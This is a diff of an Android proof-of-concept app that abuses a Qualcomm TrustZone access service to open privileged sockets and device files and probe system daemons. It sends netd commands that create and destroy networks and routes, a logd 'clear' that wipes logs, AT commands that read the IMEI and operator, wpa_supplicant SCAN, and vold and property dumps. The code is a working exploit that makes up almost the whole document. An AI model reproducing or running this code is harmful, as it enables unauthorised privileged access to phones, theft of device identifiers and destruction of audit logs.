@@ -43,6 +43,16 @@ public class MainActivity extends AppCompatActivity {
     private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
     private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
 
+    private static final int ERROR_UNAVAIL = -96;
+    private static final int ERROR_BADOBJ = -92;
+    private static final int ERROR_DEFUNCT = -90;
+    private static final int ERROR_KMEM = -97;
+    private static final int ERROR_MAXARGS = -94;
+    private static final int ERROR_MAXDATA = -95;
+    private static final int ERROR_NOSLOTS = -93;
+    private static final int ERROR_REMOTE = -98;
+    private static final int ERROR_ABORT = -91;
+
     private TextView tvStatus, tvLog;
     private Button btnStart, btnStop;
     private Handler handler = new Handler(Looper.getMainLooper());
@@ -60,6 +70,7 @@ public class MainActivity extends AppCompatActivity {
     public static native String[] nativeListDir(String path);
     public static native String nativeReadFile(String path);
     public static native String nativeTestQSEECom();
+    public static native String nativeTestFd(int fd);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -174,8 +185,12 @@ public class MainActivity extends AppCompatActivity {
         appendLog("========== Advanced TZ POC ==========");
 
         appendLog("[*] Testing QSEECom vulnerability...");
-        String qseeResult = nativeTestQSEECom();
-        appendLog("[QSEECom] Result: " + qseeResult);
+        try {
+            String qseeResult = nativeTestQSEECom();
+            appendLog("[QSEECom] Result: " + qseeResult);
+        } catch (Exception e) {
+            appendLog("[QSEECom] Exception: " + e.getMessage());
+        }
 
         String[] sockets = nativeListDir("/dev/socket");
         if (sockets == null) sockets = new String[0];
@@ -239,13 +254,13 @@ public class MainActivity extends AppCompatActivity {
         finishTest();
     }
 
-    private void testSocket(String path) throws Exception {
+    private void testSocket(String path) {
         ParcelFileDescriptor pfd = null;
         try {
             int[] handle = new int[1];
             pfd = openSocket(path, handle);
             if (pfd == null) {
-                appendLog("[ ] Failed to open " + path);
+                appendLog("[ ] Failed to open " + path + " (handle=" + (handle.length>0?handle[0]:"null") + ")");
                 return;
             }
             FileDescriptor fd = pfd.getFileDescriptor();
@@ -255,6 +270,18 @@ public class MainActivity extends AppCompatActivity {
                 return;
             }
             appendLog("[+] Opened " + path + " (handle=" + handle[0] + ")");
+
+            // handle[0] にエラーコードが入っている場合がある
+            if (handle[0] < 0) {
+                String errMsg = getErrorString(handle[0]);
+                appendLog("[!] Service returned error: " + handle[0] + " (" + errMsg + ")");
+                pfd.close();
+                return;
+            }
+
+            // FDの属性をJNIでチェック
+            String fdInfo = nativeTestFd(pfd.getFd());
+            appendLog("[FD] " + fdInfo);
 
             if (path.startsWith("/dev/socket/")) {
                 String base = new File(path).getName();
@@ -268,9 +295,10 @@ public class MainActivity extends AppCompatActivity {
                     case "wpa_ctrl_0": testWpaCtrl(fd); break;
                     case "rild": testRild(fd); break;
                     case "vold": testVold(fd); break;
-                    default: testGeneric(fd, new String[]{"help\n", "status\n", "version\n", "list\n"});
+                    default: testGeneric(fd, new String[]{"help\n", "status\n", "version\n", "list\n", "dump\n"});
                 }
             } else {
+                // デバイスファイル読み取り
                 InputStream is = new FileInputStream(fd);
                 byte[] buf = new byte[64];
                 int read = readBytes(is, buf, 64, 500);
@@ -288,7 +316,22 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private ParcelFileDescriptor openSocket(String path, int[] handle) throws Exception {
+    private String getErrorString(int code) {
+        switch(code) {
+            case ERROR_UNAVAIL: return "ERROR_UNAVAIL";
+            case ERROR_BADOBJ: return "ERROR_BADOBJ";
+            case ERROR_DEFUNCT: return "ERROR_DEFUNCT";
+            case ERROR_KMEM: return "ERROR_KMEM";
+            case ERROR_MAXARGS: return "ERROR_MAXARGS";
+            case ERROR_MAXDATA: return "ERROR_MAXDATA";
+            case ERROR_NOSLOTS: return "ERROR_NOSLOTS";
+            case ERROR_REMOTE: return "ERROR_REMOTE";
+            case ERROR_ABORT: return "ERROR_ABORT";
+            default: return "UNKNOWN";
+        }
+    }
+
+    private ParcelFileDescriptor openSocket(String path, int[] handle) {
         if (tzService == null) return null;
         try {
             Class<?> cls = tzService.getClass();
@@ -300,7 +343,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void testNetd(FileDescriptor fd) throws Exception {
+    private void testNetd(FileDescriptor fd) {
         appendLog("[NETD] Testing netd commands");
         String[] cmds = {
                 "help\n", "version\n", "interface list\n", "route list\n",
@@ -310,7 +353,10 @@ public class MainActivity extends AppCompatActivity {
                 "network create 101\n",
                 "network interface add 101 wlan0\n",
                 "network route add 101 wlan0 0.0.0.0/0 192.168.1.1\n",
-                "network destroy 101\n"
+                "network destroy 101\n",
+                "ip rule show\n",
+                "ip route show table all\n",
+                "tether status\n"
         };
         for (String cmd : cmds) {
             if (stopRequested.get()) break;
@@ -323,7 +369,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void testDnsProxy(FileDescriptor fd) throws Exception {
+    private void testDnsProxy(FileDescriptor fd) {
         appendLog("[DNS] Sending DNS query for localhost (A)");
         try {
             byte[] query = buildDnsQuery("localhost", 1);
@@ -351,9 +397,22 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             appendLog("[DNS] PTR error: " + e.getMessage());
         }
+
+        appendLog("[DNS] Sending ANY query");
+        try {
+            byte[] query = buildDnsQuery("localhost", 255);
+            byte[] resp = sendBinary(fd, query, 512, 2000);
+            if (resp != null && resp.length > 0) {
+                appendLog("[DNS] ANY response len=" + resp.length);
+            } else {
+                appendLog("[DNS] No ANY response");
+            }
+        } catch (Exception e) {
+            appendLog("[DNS] ANY error: " + e.getMessage());
+        }
     }
 
-    private void testFwmarkd(FileDescriptor fd) throws Exception {
+    private void testFwmarkd(FileDescriptor fd) {
         appendLog("[FW] Sending SELECT_NETWORK (cmd=6)");
         try {
             ByteBuffer buf = ByteBuffer.allocate(16);
@@ -392,7 +451,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void testMdnsd(FileDescriptor fd) throws Exception {
+    private void testMdnsd(FileDescriptor fd) {
         appendLog("[MDNS] Sending mDNS query for localhost.local (A)");
         try {
             byte[] query = buildDnsQuery("localhost.local", 1);
@@ -418,9 +477,22 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             appendLog("[MDNS] PTR error: " + e.getMessage());
         }
+
+        appendLog("[MDNS] Sending service query _http._tcp.local");
+        try {
+            byte[] query = buildDnsQuery("_http._tcp.local", 12);
+            byte[] resp = sendBinary(fd, query, 512, 2000);
+            if (resp != null && resp.length > 0) {
+                appendLog("[MDNS] Service response len=" + resp.length);
+            } else {
+                appendLog("[MDNS] No service response");
+            }
+        } catch (Exception e) {
+            appendLog("[MDNS] Service error: " + e.getMessage());
+        }
     }
 
-    private void testLogd(FileDescriptor fd) throws Exception {
+    private void testLogd(FileDescriptor fd) {
         appendLog("[LOGD] Reading logd (no command)");
         try {
             InputStream is = new FileInputStream(fd);
@@ -437,7 +509,7 @@ public class MainActivity extends AppCompatActivity {
             appendLog("[LOGD] Error: " + e.getMessage());
         }
 
-        appendLog("[LOGD] Sending clear command (if accepted)");
+        appendLog("[LOGD] Sending clear command");
         try {
             String resp = sendTextCommand(fd, "clear\n", 500);
             appendLog("[LOGD] clear response: " + (resp != null ? resp : "(none)"));
@@ -446,7 +518,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void testPropertyService(FileDescriptor fd) throws Exception {
+    private void testPropertyService(FileDescriptor fd) {
         appendLog("[PROP] Sending get commands");
         String[] props = {
                 "ro.build.version.release", "ro.product.model", "ro.product.manufacturer",
@@ -462,6 +534,14 @@ public class MainActivity extends AppCompatActivity {
             } catch (Exception e) {
                 appendLog("[PROP] Error getting " + p + ": " + e.getMessage());
             }
+        }
+
+        appendLog("[PROP] Trying list command");
+        try {
+            String resp = sendTextCommand(fd, "list\n", 500);
+            appendLog("[PROP] list response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+        } catch (Exception e) {
+            appendLog("[PROP] list error: " + e.getMessage());
         }
     }
 
@@ -488,7 +568,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void testWpaCtrl(FileDescriptor fd) throws Exception {
+    private void testWpaCtrl(FileDescriptor fd) {
         appendLog("[WPA] Sending STATUS");
         try {
             String resp = sendTextCommand(fd, "STATUS\n", 1000);
@@ -504,9 +584,17 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             appendLog("[WPA] LIST_NETWORKS error: " + e.getMessage());
         }
+
+        appendLog("[WPA] Sending SCAN");
+        try {
+            String resp = sendTextCommand(fd, "SCAN\n", 1000);
+            appendLog("[WPA] SCAN response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+        } catch (Exception e) {
+            appendLog("[WPA] SCAN error: " + e.getMessage());
+        }
     }
 
-    private void testRild(FileDescriptor fd) throws Exception {
+    private void testRild(FileDescriptor fd) {
         appendLog("[RILD] Sending AT+CGMI");
         try {
             byte[] at = "AT+CGMI\r\n".getBytes(StandardCharsets.UTF_8);
@@ -532,9 +620,22 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             appendLog("[RILD] CGSN error: " + e.getMessage());
         }
+
+        appendLog("[RILD] Sending AT+COPS?");
+        try {
+            byte[] at = "AT+COPS?\r\n".getBytes(StandardCharsets.UTF_8);
+            byte[] resp = sendBinary(fd, at, 256, 1500);
+            if (resp != null) {
+                appendLog("[RILD] COPS response: " + new String(resp, StandardCharsets.UTF_8).replace("\n", "\\n"));
+            } else {
+                appendLog("[RILD] No COPS response");
+            }
+        } catch (Exception e) {
+            appendLog("[RILD] COPS error: " + e.getMessage());
+        }
     }
 
-    private void testVold(FileDescriptor fd) throws Exception {
+    private void testVold(FileDescriptor fd) {
         appendLog("[VOLD] Sending status");
         try {
             String resp = sendTextCommand(fd, "status\n", 1000);
@@ -550,9 +651,17 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             appendLog("[VOLD] list error: " + e.getMessage());
         }
+
+        appendLog("[VOLD] Sending dump");
+        try {
+            String resp = sendTextCommand(fd, "dump\n", 1000);
+            appendLog("[VOLD] dump response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+        } catch (Exception e) {
+            appendLog("[VOLD] dump error: " + e.getMessage());
+        }
     }
 
-    private void testGeneric(FileDescriptor fd, String[] cmds) throws Exception {
+    private void testGeneric(FileDescriptor fd, String[] cmds) {
         for (String cmd : cmds) {
             if (stopRequested.get()) break;
             try {
@@ -696,7 +805,10 @@ public class MainActivity extends AppCompatActivity {
 
     private void saveLog() {
         try {
-            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+            File dir = null;
+            if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
+                dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+            }
             if (dir == null || !dir.exists()) {
                 if (dir != null && !dir.mkdirs()) {
                     appendLog("Cannot create Download dir, using internal storage");
